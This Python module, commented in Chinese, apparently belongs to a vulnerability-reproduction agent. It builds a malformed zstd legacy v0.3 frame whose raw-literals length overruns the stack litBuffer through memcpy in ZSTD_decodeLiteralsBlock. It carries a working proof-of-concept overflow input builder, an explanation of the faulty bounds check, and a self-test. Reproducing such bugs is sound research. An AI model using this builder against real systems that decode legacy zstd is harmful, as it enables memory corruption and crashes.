"""CG-28（arvo:16445 / zstd legacy v0.3）raw literals 构造器。

**缺陷**：lib/legacy/zstd_v03.c 的 ZSTD_decodeLiteralsBlock()，IS_RAW 分支：

    const size_t litSize = (MEM_readLE32(istart) & 0xFFFFFF) >> 2;
    if (litSize > srcSize-11) {                  /* 只是"输入够不够"的检查 */
        if (litSize > srcSize-3) return ERROR(corruption_detected);
        memcpy(dctx->litBuffer, istart, litSize);   /* litBuffer 只有 BLOCKSIZE+8 */
        ...
    }

检查只保证 litSize 不超过**输入**，却没保证不超过 dctx->litBuffer（128KB+8）；
把 litSize 做到 131082 就写穿栈上的 litBuffer（官方 WRITE of size 131082）。

**v0.3 格式（本构造器按源码实现）**：

    magic = 0xFD2FB523（4 字节 LE: 23 B5 2F FD）
    block header（3 字节）：cSize = in[2] | (in[1]<<8) | ((in[0]&7)<<16)
                            blockType = in[0] >> 6（0=compressed, 1=raw, 2=rle, 3=end）
    压缩块载荷首字节低 2 位 = IS_RAW(1)，litSize = (LE24 >> 2)

要让 memcpy 分支成立，需要 litSize > cSize-11 且 litSize <= cSize-3，
即 cSize 取 litSize+3 .. litSize+10。
"""
from __future__ import annotations

BLOCKSIZE = 128 * 1024
MAGIC = 0xFD2FB523
IS_RAW = 1
BT_COMPRESSED = 0

FIELDS = {
    "lit_size": "int, literals 长度（默认 131082 = BLOCKSIZE+10，刚写穿 litBuffer）",
    "slack": "int(3..10), cSize 比 litSize 多出的字节（默认 4；必须满足 litSize<=cSize-3）",
    "last_block": "int(0|1), 块头最高位是否为 last block（默认 0）",
    "fill": "int(0..255), 载荷填充字节（默认 0x41）",
    "seed_prefix": "int, harness 的 4 字节种子前缀（默认 0）",
}

DECLARED_SINK = {
    "file": "lib/legacy/zstd_v03.c",
    "line": 2529,
    "symbol": "memcpy",
    "note": "IS_RAW 分支只校验 litSize 不超过输入，不校验不超过 dctx->litBuffer(128KB+8)",
}


class ZstdLegacyResult:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "zstd_legacy"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> ZstdLegacyResult:
    fields = dict(fields or {})
    try:
        lit_size = int(fields.get("lit_size", BLOCKSIZE + 10))
        slack = int(fields.get("slack", 4))
        last_block = int(fields.get("last_block", 0))
        fill = int(fields.get("fill", 0x41))
    except (TypeError, ValueError):
        return ZstdLegacyResult(False, reason="lit_size/slack/last_block/fill 必须是整数")
    if not 1 <= lit_size <= 0x3FFFFF:
        return ZstdLegacyResult(False, reason="lit_size 越界（1..0x3FFFFF）: %d" % lit_size)
    if not 3 <= slack <= 10:
        return ZstdLegacyResult(False, reason="slack 越界（3..10）: %d" % slack)
    if not 0 <= fill <= 255:
        return ZstdLegacyResult(False, reason="fill 越界（0..255）: %d" % fill)

    csize = lit_size + slack
    if csize > 0x7FFFF:
        return ZstdLegacyResult(False, reason="cSize 超出 v0.3 块头可表示范围: %d" % csize)
    # 块头：in[0] 高 2 位 = blockType，低 3 位 = cSize 最高位
    h0 = ((BT_COMPRESSED << 6) | ((csize >> 16) & 7) | ((last_block & 1) << 7)) & 0xFF
    h1 = (csize >> 8) & 0xFF
    h2 = csize & 0xFF
    # literals 头：低 2 位 = IS_RAW，其余 22 位是 litSize
    lit_hdr = ((lit_size << 2) | IS_RAW) & 0xFFFFFF
    payload = bytes([lit_hdr & 0xFF, (lit_hdr >> 8) & 0xFF, (lit_hdr >> 16) & 0xFF])

    # 载荷剩余部分补 fill；但首字节已用于 literals 头，所以从第 3 字节之后填
    body = bytearray(payload)
    body += bytes([fill]) * (csize - len(payload))

    frame = MAGIC.to_bytes(4, "little") + bytes([h0, h1, h2]) + bytes(body)
    # simple_decompress 的 harness 先吃掉 4 字节做种子（FUZZ_seed(&src, &size)），
    # 所以真正的 frame 必须前面再补 4 字节，否则 magic 对不上直接 prefix_unknown。
    seed = int(fields.get("seed_prefix", 0)) & 0xFFFFFFFF
    frame = seed.to_bytes(4, "little") + frame
    used = {"lit_size": lit_size, "csize": csize, "slack": slack,
            "block_type": "compressed", "last_block": last_block,
            "magic": "0x%08x" % MAGIC, "bytes": len(frame)}
    if lit_size <= BLOCKSIZE:
        used["warning"] = "lit_size=%d <= BLOCKSIZE，不会写穿 litBuffer" % lit_size
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "zstd_legacy 构造器不识别该字段"}
               for k in fields if k not in known]
    return ZstdLegacyResult(True, bytes(frame), used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：v0.3 raw literals 的 memcpy 写穿栈上 litBuffer。"""
    return {
        "claim_id": "cg28-zstd-v03-literals",
        "subject": "ZSTD_decodeLiteralsBlock",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/zstd_legacy.py + arvo error.txt",
        "cwe": "CWE-121",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "zstd_legacy"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    assert r.data[:8][4:] == b"\x23\xB5\x2F\xFD", r.data[:8]
    csize = r.fields_used["csize"]
    assert csize == 131082 + 4
    h0 = r.data[8]
    assert (h0 >> 6) == BT_COMPRESSED
    assert ((r.data[8] & 7) << 16 | (r.data[9] << 8) | r.data[10]) == csize
    lit = int.from_bytes(r.data[11:14], "little")
    assert (lit & 3) == IS_RAW
    assert (lit >> 2) == r.fields_used["lit_size"]
    assert r.size == 4 + 7 + csize
    small = build({"lit_size": 4096})
    assert small.ok and "warning" in small.fields_used
    assert not build({"lit_size": 0}).ok
    assert not build({"slack": 2}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "ZSTD_decodeLiteralsBlock" and c["sink"]["line"] == 2529
    print("zstd_legacy builder self-check OK:", r.to_record())
